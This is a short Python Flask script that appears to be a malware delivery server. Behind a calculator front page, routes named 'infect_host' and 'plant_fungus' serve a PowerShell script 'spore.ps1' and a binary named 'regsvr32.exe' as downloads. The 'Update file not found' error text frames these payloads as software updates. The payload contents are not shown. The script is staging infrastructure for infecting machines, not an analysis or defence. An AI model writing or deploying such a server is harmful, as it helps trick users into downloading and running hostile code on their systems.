from flask import Flask, send_file, render_template, request, jsonify
from flask_cors import CORS
import subprocess
import os

FUNGUS = r".\regsvr32.exe"
SPORE = r".\spore.ps1"

def main():
    app = Flask(__name__)
    CORS(app)
    
    @app.route("/")
    def calculator():
        return render_template("index.html")
    
    @app.route("/spore", methods=['GET'])
    def infect_host():
        if os.path.exists(SPORE):
            return send_file(SPORE, as_attachment=True)
        else:
            return "Update file not found.", 404
    
    @app.route("/fungus", methods=['GET'])
    def plant_fungus():
        if os.path.exists(FUNGUS):
            return send_file(FUNGUS, as_attachment=True)
        else:
            return "Update file not found.", 404
    
    app.run(host="127.0.0.1", port=8081, debug=True)

if __name__ == "__main__":
    main()